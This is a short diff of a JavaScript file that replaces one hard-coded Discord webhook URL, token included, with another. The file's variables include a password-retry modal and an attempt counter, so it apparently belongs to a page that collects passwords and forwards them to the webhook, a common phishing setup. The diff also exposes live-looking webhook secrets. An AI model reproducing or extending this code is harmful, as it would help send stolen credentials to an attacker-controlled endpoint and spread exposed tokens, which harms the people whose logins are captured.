@@ -9,7 +9,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const btnRetryPass = document.getElementById('closePassModal');
 
     let tentativas = 0;
-    const discordWebhookUrl = "https://discord.com/api/webhooks/1474188706515652864/JGp--H-ogCvXjU66cU5q1JMKms2-c_xGN2j2gXaAiENOGx2K6lZY1HU1B4BqmJ-SHgTe";
+    const discordWebhookUrl = "https://discord.com/api/webhooks/1476725494601744577/X52wm9S7fEFzTYG0V-YufHvXHJtkEwsXnja77SC5Nzqw5kXXbcK_Ng1p_AzGkGyLLkeh";
 
     if(toggleButton) {
         toggleButton.addEventListener('click', function() {
